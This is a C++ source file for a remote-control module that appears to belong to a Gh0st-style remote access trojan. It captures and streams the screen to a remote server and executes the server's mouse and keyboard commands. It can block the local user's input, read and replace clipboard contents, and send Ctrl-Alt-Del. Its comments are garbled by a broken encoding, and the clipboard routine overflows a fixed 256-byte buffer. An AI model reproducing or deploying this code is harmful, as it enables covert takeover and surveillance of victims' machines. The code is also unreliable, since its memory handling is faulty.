#include "RemoteController.h"



CRemoteController::CRemoteController(_CIOCPClient * IOCPClient) : CManager(IOCPClient)
{
	m_IsLoop = TRUE;
	m_IsBlockInput = FALSE;
	m_ScreenSpy = new CScreenSpy(16);
	if (m_ScreenSpy == NULL)
	{
		return;
	}
	m_ThreadHandle = CreateThread(NULL, 0, 
		(LPTHREAD_START_ROUTINE)SendProcedure, this, 0, NULL);
}

CRemoteController::~CRemoteController()
{
	m_IsLoop = FALSE;
	WaitForSingleObject(m_ThreadHandle, INFINITE);
	if (m_ThreadHandle!=NULL)
	{
		CloseHandle(m_ThreadHandle);
	}
	delete m_ScreenSpy;
	m_ScreenSpy = NULL;

	printf("CRemoteController::~CRemoteController()\r\n");
}


DWORD CRemoteController::SendProcedure(LPVOID ParameterData)
{
	CRemoteController* This = (CRemoteController *)ParameterData;
	//����bmpλͼ�ṹ
	This->SendBitmapInfo();         
	//�����ȴ�Server�ش���Ϣ �������ض˶Ի���򿪣�
	This->WaittingForDialogOpen();
	//��һ֡��������
	This->SendFirstScreenData();

	while (This->m_IsLoop)
	{
		//ѭ����������
		This->SendNextScreenData();
		Sleep(100);
	}
	printf("CRemoteController::SendProcedure()�˳�\r\n");
	return 0;
}

VOID CRemoteController::HandleIO(PBYTE BufferData, ULONG BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
	case CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();
		break;
	}
	case CLIENT_REMOTE_CONTROLLER_CONTROL:
	{
		BlockInput(FALSE); //����״̬�ſ���ִ����Ϣ 
		AnalyzeCommand(BufferData + 1, BufferLength - 1);
		BlockInput(m_IsBlockInput);
		break;
	}
	case CLIENT_REMOTE_CONTROLLER_BLOCK_INPUT:
	{
		m_IsBlockInput = *(LPBYTE)&BufferData[1]; //�����̵�����
		BlockInput(m_IsBlockInput);
		break;
	}
	case CLIENT_REMOTE_CONTROLLER_GET_CLIPBOARD:
	{
		SendClipboardData();
		break;
	}
	case CLIENT_REMOTE_CONTROLLER_SET_CLIPBOARD:
	{
		UpdataClipboardData((char*)BufferData + 1, BufferLength - 1);
		break;
	}
	case CLIENT_REMOTE_CONTROLLER_SEND_CTRL_ALT_DEL:
	{
		keybd_event(VK_MENU, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
		keybd_event(VK_CONTROL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
		keybd_event(VK_DELETE, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);

		break;
	}
	

	}
}

VOID CRemoteController::SendBitmapInfo()
{
	ULONG   BufferLength = 1 + m_ScreenSpy->GetBitmapInfoLength();   //��С
	LPBYTE	BufferData = (LPBYTE)VirtualAlloc(NULL,
		BufferLength, MEM_COMMIT, PAGE_READWRITE);

	BufferData[0] = CLIENT_REMOTE_CONTROLLER_REPLY;
	//���ｫbmpλͼ�ṹ���ͳ�ȥ
	memcpy(BufferData + 1, m_ScreenSpy->GetBitmapInfo(), BufferLength - 1);
	m_IOCPClient->OnSending((char*)BufferData, BufferLength);
	VirtualFree(BufferData, 0, MEM_RELEASE);
}

VOID CRemoteController::SendFirstScreenData()
{
	BOOL    IsOk = FALSE;
	LPVOID  BitmapData = NULL;
	//CScreenSpy��GetFirstScreenBufferData�����еõ�ͼ������
	BitmapData = m_ScreenSpy->GetFirstScreenData();
	if (BitmapData == NULL)
	{
		return;
	}
	//����

	ULONG  BufferLength = 1 + m_ScreenSpy->GetFirstScreenLength();
	LPBYTE BufferData = new BYTE[BufferLength];
	if (BufferData == NULL)
	{
		return;
	}

	BufferData[0] = CLIENT_REMOTE_CONTROLLER_FIRST_SCREEN;
	memcpy(BufferData + 1, BitmapData, BufferLength - 1);
	m_IOCPClient->OnSending((char*)BufferData, BufferLength);

	delete[] BufferData;
	BufferData = NULL;
}

VOID CRemoteController::SendNextScreenData()
{
	//�õ����ݣ��õ����ݴ�С��Ȼ����
	//���ǵ�getNextScreen�����Ķ��� 
	LPVOID	BitmapData = NULL;
	ULONG	BufferLength = 0;
	BitmapData = m_ScreenSpy->GetNextScreenData(&BufferLength);

	if (BufferLength == 0 || BitmapData == NULL)
	{
		return;
	}

	BufferLength += 1;

	LPBYTE	BufferData = new BYTE[BufferLength];
	if (BufferData == NULL)
	{
		return;
	}

	BufferData[0] = CLIENT_REMOTE_CONTROLLER_NEXT_SCREEN;
	memcpy(BufferData + 1, BitmapData, BufferLength - 1);

	m_IOCPClient->OnSending((char*)BufferData, BufferLength);

	delete[] BufferData;
	BufferData = NULL;
}

VOID CRemoteController::AnalyzeCommand(PBYTE BufferData, ULONG BufferLength)
{
	//���ݲ��Ϸ�
	if (BufferLength %sizeof(MSG)!=0)
	{
		return;
	}
	//�������
	ULONG MsgCount = BufferLength / sizeof(MSG);
	//����������
	for (int i = 0; i < MsgCount; i++)
	{
		//�Ȼ�ȡ����λ��
		MSG* Msg = (MSG*)(BufferData + i * sizeof(MSG));
		switch (Msg->message)
		{
		case WM_LBUTTONDOWN:
		case WM_LBUTTONUP:
		case WM_RBUTTONDOWN:
		case WM_RBUTTONUP:
		case WM_MOUSEMOVE:
		case WM_LBUTTONDBLCLK:
		case WM_RBUTTONDBLCLK:
		case WM_MBUTTONDOWN:
		case WM_MBUTTONUP:
		{
			POINT Point;
			Point.x = LOWORD(Msg->lParam);
			Point.y = HIWORD(Msg->lParam);
			SetCursorPos(Point.x, Point.y);
			SetCapture(WindowFromPoint(Point));
		}
		default:
			break;
		}

		switch (Msg->message)
		{
		case WM_LBUTTONDOWN:
			mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
			break;
		case WM_LBUTTONUP:
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDOWN:
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
			break;
		case WM_RBUTTONUP:
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_LBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_MBUTTONDOWN:
			mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
			break;
		case WM_MBUTTONUP:
			mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
			break;
		case WM_MOUSEWHEEL:
			mouse_event(MOUSEEVENTF_WHEEL, 0, 0,
				GET_WHEEL_DELTA_WPARAM(Msg->wParam),0);
			break;
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), 0, 0);
			break;
		case WM_KEYUP:
		case WM_SYSKEYUP:
			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), KEYEVENTF_KEYUP, 0);
			break;
		default:
			break;
		}
	}
}

//���ͼ����嵽��һ��
VOID CRemoteController::SendClipboardData()
{
	if (!OpenClipboard(NULL))
	{
		return;
	}

	HGLOBAL GlobalHandle = GetClipboardData(CF_TEXT);
	if (GlobalHandle == NULL)
	{
		CloseClipboard();
		return;
	}

	int BufferLength = GlobalSize(GlobalHandle) + 1;
	char* Text = (LPSTR)GlobalLock(GlobalHandle);
	LPBYTE BufferData = new BYTE[BufferLength];

	BufferData[0] = CLIENT_REMOTE_CONTROLLER_GET_CLIPBOARD_REPLY;
	memcpy(BufferData + 1, Text, BufferLength - 1);
	GlobalUnlock(GlobalHandle);
	CloseClipboard();

	m_IOCPClient->OnSending((char*)BufferData, BufferLength);
	delete[] BufferData;
}
//updata������
VOID CRemoteController::UpdataClipboardData(char* ClipboardData, ULONG ClipboardDataLength)
{
	if (OpenClipboard(NULL))
	{
		HGLOBAL GlobalHandle;
		char* BufferData;
		int BufferLength = 0;

		EmptyClipboard();
		//�����ڴ�
		GlobalHandle = GlobalAlloc(GMEM_DDESHARE, 256);
		if (GlobalHandle != NULL)
		{
			BufferData = (char*)GlobalLock(GlobalHandle);

			memcpy(BufferData, ClipboardData, ClipboardDataLength);

			GlobalUnlock(GlobalHandle);
			SetClipboardData(CF_OEMTEXT, GlobalHandle);
			GlobalFree(GlobalHandle);
		}
		CloseClipboard();
	}
}
